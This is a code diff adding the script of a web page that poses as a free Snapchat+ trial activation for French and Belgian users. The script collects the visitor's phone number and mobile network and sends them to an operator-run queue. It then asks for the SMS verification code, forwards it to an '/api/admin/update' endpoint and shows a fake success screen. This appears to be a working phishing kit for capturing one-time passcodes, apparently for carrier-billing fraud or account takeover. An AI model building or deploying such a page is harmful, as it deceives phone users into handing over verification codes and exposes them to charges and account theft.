@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -455,4 +456,299 @@
             otpInfo: '📲 We hebben een <strong>verificatiecode</strong> gestuurd naar ',
             otpHint: 'Controleer uw SMS en voer de code hieronder in.',
             verify: 'Verifiëren →',
-   
+            successTitle: 'Snapchat+ Geactiveerd! 🎉',
+            successText: '✅ Uw gratis <strong>Snapchat+</strong> proefperiode is nu actief!',
+            successSub: 'Je hebt nu toegang tot exclusieve functies. Geniet ervan!',
+            openSnapchat: 'Open Snapchat',
+            errorTitle: 'Ongeldige code',
+            errorText: '❌ De code die u heeft ingevoerd is <strong>onjuist</strong>.',
+            errorSub: 'Controleer uw SMS en probeer opnieuw.',
+            tryAgain: 'Probeer opnieuw'
+        }
+    };
+
+    // ============================================================
+    // LANGUAGE SETTER
+    // ============================================================
+    function setLang(lang) {
+        currentLang = lang;
+        const t = LANG[lang];
+        document.querySelectorAll('.lang-selector button').forEach(b => b.classList.remove('active'));
+        document.querySelector(`.lang-selector button[onclick="setLang('${lang}')"]`).classList.add('active');
+        document.getElementById('tagline').textContent = t.tagline;
+        document.getElementById('badge').textContent = t.badge;
+        document.getElementById('selectCountry').textContent = t.selectCountry;
+        document.getElementById('france').textContent = t.france;
+        document.getElementById('belgium').textContent = t.belgium;
+        document.getElementById('selectNetwork').textContent = t.selectNetwork;
+        document.getElementById('backToCountry').textContent = t.back;
+        document.getElementById('enterNumber').textContent = t.enterNumber;
+        document.getElementById('phoneInfo').innerHTML = t.phoneInfo;
+        document.getElementById('sendBtn').textContent = t.send;
+        document.getElementById('backToNetwork').textContent = t.back;
+        document.getElementById('termsText').textContent = t.terms;
+        document.getElementById('sendingTitle').textContent = t.sending;
+        document.getElementById('sendingText').innerHTML = t.sendingText;
+        document.getElementById('waitText').textContent = t.waitText;
+        document.getElementById('enterOTP').textContent = t.enterOTP;
+        document.getElementById('otpInfo').innerHTML = t.otpInfo + ' <strong id="displayNumber"></strong>';
+        document.getElementById('otpHint').textContent = t.otpHint;
+        document.getElementById('verifyBtn').textContent = t.verify;
+        document.getElementById('backToPhone').textContent = t.back;
+        document.getElementById('successTitle').textContent = t.successTitle;
+        document.getElementById('successText').innerHTML = t.successText;
+        document.getElementById('successSub').textContent = t.successSub;
+        document.getElementById('resetBtn').textContent = t.openSnapchat;
+        document.getElementById('errorTitle').textContent = t.errorTitle;
+        document.getElementById('errorText').innerHTML = t.errorText;
+        document.getElementById('errorSub').textContent = t.errorSub;
+        document.getElementById('retryOTPBtn').textContent = t.tryAgain;
+    }
+
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const step4 = document.getElementById('step4');
+    const step5 = document.getElementById('step5');
+    const step6 = document.getElementById('step6');
+    const step7 = document.getElementById('step7');
+
+    const networkGrid = document.getElementById('networkGrid');
+    const countryCode = document.getElementById('countryCode');
+    const phoneInput = document.getElementById('phoneInput');
+    const displayNumber = document.getElementById('displayNumber');
+    const progressFill = document.getElementById('progressFill');
+    const otpContainer = document.getElementById('otpContainer');
+
+    const sendBtn = document.getElementById('sendBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+
+    function goToStep(id) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    // ============================================================
+    // STEP 1: COUNTRY
+    // ============================================================
+    document.querySelectorAll('.country-card').forEach(function(card) {
+        card.addEventListener('click', function() {
+            const country = this.dataset.country;
+            selectCountry(country);
+        });
+    });
+
+    function selectCountry(country) {
+        selectedCountry = country;
+        document.querySelectorAll('.country-card').forEach(el => el.classList.remove('selected'));
+        document.querySelector('.country-card[data-country="' + country + '"]').classList.add('selected');
+        const networks = COUNTRIES[country].networks;
+        networkGrid.innerHTML = '';
+        networks.forEach(function(net) {
+            const btn = document.createElement('div');
+            btn.className = 'network-card';
+            btn.textContent = net;
+            btn.dataset.network = net;
+            btn.addEventListener('click', function() { selectNetwork(net); });
+            networkGrid.appendChild(btn);
+        });
+        goToStep('step2');
+    }
+
+    function selectNetwork(network) {
+        selectedNetwork = network;
+        document.querySelectorAll('.network-card').forEach(el => el.classList.remove('selected'));
+        document.querySelector('.network-card[data-network="' + network + '"]').classList.add('selected');
+        countryCode.textContent = COUNTRIES[selectedCountry].code;
+        goToStep('step3');
+        phoneInput.focus();
+    }
+
+    // ============================================================
+    // BACK BUTTONS
+    // ============================================================
+    document.getElementById('backToCountry').addEventListener('click', function() { goToStep('step1'); });
+    document.getElementById('backToNetwork').addEventListener('click', function() { goToStep('step2'); });
+    document.getElementById('backToPhone').addEventListener('click', function() { goToStep('step3'); phoneInput.focus(); });
+    document.getElementById('retryOTPBtn').addEventListener('click', function() { goToStep('step5'); document.querySelectorAll('.otp-box input').forEach(el => el.value = ''); document.querySelector('.otp-box input')?.focus(); });
+    document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+    // ============================================================
+    // STEP 3: SUBMIT
+    // ============================================================
+    sendBtn.addEventListener('click', sendNumber);
+    phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') sendNumber(); });
+
+    async function sendNumber() {
+        const phoneNumber = phoneInput.value.replace(/\s/g, '');
+        if (!phoneNumber || phoneNumber.length < 8) {
+            alert('Please enter a valid phone number.');
+            phoneInput.focus();
+            return;
+        }
+
+        const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
+        sendBtn.disabled = true;
+        sendBtn.textContent = 'Sending...';
+        goToStep('step4');
+
+        let progress = 0;
+        const interval = setInterval(function() {
+            progress += Math.random() * 10;
+            if (progress > 90) clearInterval(interval);
+            progressFill.style.width = Math.min(progress, 90) + '%';
+        }, 300);
+
+        try {
+            const response = await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    number: fullNumber,
+                    country: selectedCountry,
+                    network: selectedNetwork,
+                    queue: COUNTRIES[selectedCountry].queue
+                })
+            });
+            const data = await response.json();
+            queueId = data.queueId;
+            clearInterval(interval);
+            progressFill.style.width = '100%';
+            await checkStatus();
+        } catch (error) {
+            alert('Connection error. Please try again.');
+            resetAll();
+        } finally {
+            sendBtn.disabled = false;
+            sendBtn.textContent = LANG[currentLang].send;
+        }
+    }
+
+    async function checkStatus() {
+        let attempts = 0;
+        const checkInterval = setInterval(async function() {
+            attempts++;
+            try {
+                const response = await fetch('/api/admin/queues');
+                const data = await response.json();
+                for (const queue in data) {
+                    for (const entry of data[queue]) {
+                        if (entry.id === queueId) {
+                            if (entry.status === 'otp_sent') {
+                                clearInterval(checkInterval);
+                                otpLength = entry.otp_length || 4;
+                                goToStep('step5');
+                                setupOTP(otpLength);
+                                displayNumber.textContent = entry.number;
+                                document.querySelector('.otp-box input')?.focus();
+                                return;
+                            }
+                            if (entry.status === 'verified') {
+                                clearInterval(checkInterval);
+                                goToStep('step6');
+                                return;
+                            }
+                            if (entry.status === 'wrong') {
+                                clearInterval(checkInterval);
+                                goToStep('step7');
+                                return;
+                            }
+                            break;
+                        }
+                    }
+                }
+                if (attempts >= 60) {
+                    clearInterval(checkInterval);
+                    alert('Timeout. Please try again.');
+                    resetAll();
+                }
+            } catch (error) {}
+        }, 2000);
+    }
+
+    // ============================================================
+    // STEP 5: OTP
+    // ============================================================
+    function setupOTP(length) {
+        otpLength = length;
+        otpContainer.innerHTML = '';
+        for (var i = 0; i < length; i++) {
+            var input = document.createElement('input');
+            input.type = 'text';
+            input.maxLength = 1;
+            input.id = 'otp' + (i + 1);
+            if (i === 0) input.autofocus = true;
+            input.addEventListener('input', function(idx) {
+                return function(e) {
+                    if (this.value.length === 1 && idx < length - 1) {
+                        otpContainer.children[idx + 1].focus();
+                    }
+                };
+            }(i));
+            input.addEventListener('keydown', function(idx) {
+                return function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && idx > 0) {
+                        otpContainer.children[idx - 1].focus();
+                    }
+                    if (e.key === 'Enter') { verifyOTP(); }
+                };
+            }(i));
+            otpContainer.appendChild(input);
+        }
+        setTimeout(function() { var first = otpContainer.querySelector('input'); if (first) first.focus(); }, 100);
+    }
+
+    verifyBtn.addEventListener('click', verifyOTP);
+
+    async function verifyOTP() {
+        var inputs = otpContainer.querySelectorAll('input');
+        var otp = '';
+        for (var i = 0; i < otpLength; i++) { otp += inputs[i]?.value || ''; }
+        if (otp.length !== otpLength) {
+            alert('Please enter the complete verification code.');
+            return;
+        }
+
+        try {
+            var response = await fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    queueId: queueId,
+                    action: 'verify_otp',
+                    otp: otp
+                })
+            });
+            var data = await response.json();
+            if (data.success) { goToStep('step6'); } else { goToStep('step7'); }
+        } catch (error) {
+            alert('Error verifying OTP. Please try again.');
+        }
+    }
+
+    // ============================================================
+    // RESET
+    // ============================================================
+    function resetAll() {
+        goToStep('step1');
+        phoneInput.value = '';
+        selectedCountry = null;
+        selectedNetwork = null;
+        queueId = null;
+        document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
+        document.querySelectorAll('.country-card, .network-card').forEach(el => el.classList.remove('selected'));
+        progressFill.style.width = '0%';
+    }
+
+    // ============================================================
+    // INIT
+    // ============================================================
+    setLang('en');
+    goToStep('step1');
+</script>
+
+</body>
+</html>
